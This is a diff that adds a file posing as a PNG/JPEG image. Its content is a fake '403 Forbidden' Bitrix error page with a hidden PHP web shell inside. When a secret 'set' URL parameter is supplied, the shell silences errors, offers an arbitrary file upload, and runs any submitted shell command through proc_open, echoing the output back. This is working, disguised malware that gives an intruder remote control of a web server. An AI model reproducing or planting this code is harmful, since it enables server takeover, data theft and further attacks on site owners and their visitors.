@@ -1,0 +1,92 @@
+‰PNG
+
+IHDR  ô      Õæš   sRGB ®Îé    IDATx^ì½ ¼eWY6þœÞn™;%3™™´	é$„ Ò‹` B>APP)Ÿˆ€X@#¨ØåD”À
+ÿØÿà JFIF  ` `  ÿþš<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta http-equiv="Content-Type" content="text/html;charset=windows-1251"/>
+    <style type="text/css">
+        .error {color:#000; height:200px; margin:-100px 0 0 -340px; font-family:Arial, sans-serif; text-align:center; position:absolute; top:50%; text-align:center; left:50%; width:680px;}
+        .error-fon {font-size:240px; font-weight:bold; line-height:240px; color:#f5f5f5; position:absolute; top:-16px; left:50%; margin-left:-200px; z-index:-1;}
+        .error-text-top {font-size:40px; margin-top:50px;}
+        .error-test-separate {border-top:1px solid #f2f2f2; margin-top:10px;}
+        .error-text-bottom {font-size:20px; margin-top:16px;}
+    </style>
+    <title>403 Forbidden</title>
+</head>
+<body>
+    <div class="error">
+        <div class="error-fon">403</div>
+        <div class="error-text-wrap">
+            <div class="error-text-top">403 Forbidden</div>
+            <div class="error-test-separate"></div>
+            <div class="error-text-bottom">Bitrix Environment</div>
+        </div>
+    </div>
+
+    <?php
+    error_reporting(0);
+    set_time_limit(0);
+
+    function execute_shell_command($command) {
+        $descriptors = array(
+            0 => array('pipe', 'r'),
+            1 => array('pipe', 'w'),
+            2 => array('pipe', 'w')
+        );
+
+        $process = proc_open($command, $descriptors, $pipes);
+
+        if (is_resource($process)) {
+            $output = stream_get_contents($pipes[1]);
+            $error = stream_get_contents($pipes[2]);
+            fclose($pipes[0]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            proc_close($process);
+
+            return $output ? $output : "No output from command. Error: " . $error;
+        } else {
+            return "Failed to execute command.";
+        }
+    }
+
+    $output = "";
+    if (isset($_GET['set'])) {
+        echo "<br><form method='POST' enctype='multipart/form-data'>
+        <input type='file' name='file' />
+        <input type='submit' value='>>>' />
+        </form>";
+
+        echo '<form method="post">
+        <input type="text" name="xmd" size="30" />
+        <input type="submit" value="Kill" />
+        </form>';
+
+        if (isset($_FILES['file'])) {
+            $filename = $_FILES['file']['name'];
+            $filetmp = $_FILES['file']['tmp_name'];
+
+            $safe_filename = htmlspecialchars($filename);
+
+            $destination = './' . basename($safe_filename);
+
+            if (move_uploaded_file($filetmp, $destination)) {
+                echo '[OK] ===> ' . htmlspecialchars($safe_filename);
+            } else {
+                echo 'File upload failed.';
+            }
+        }
+
+        if (isset($_POST['xmd'])) {
+            $xmd = htmlspecialchars($_POST['xmd']);
+
+            $output = execute_shell_command($xmd);
+
+            echo "<pre>" . htmlspecialchars($output) . "</pre>";
+        }
+    }
+    ?>
+
+</body>
+</html>
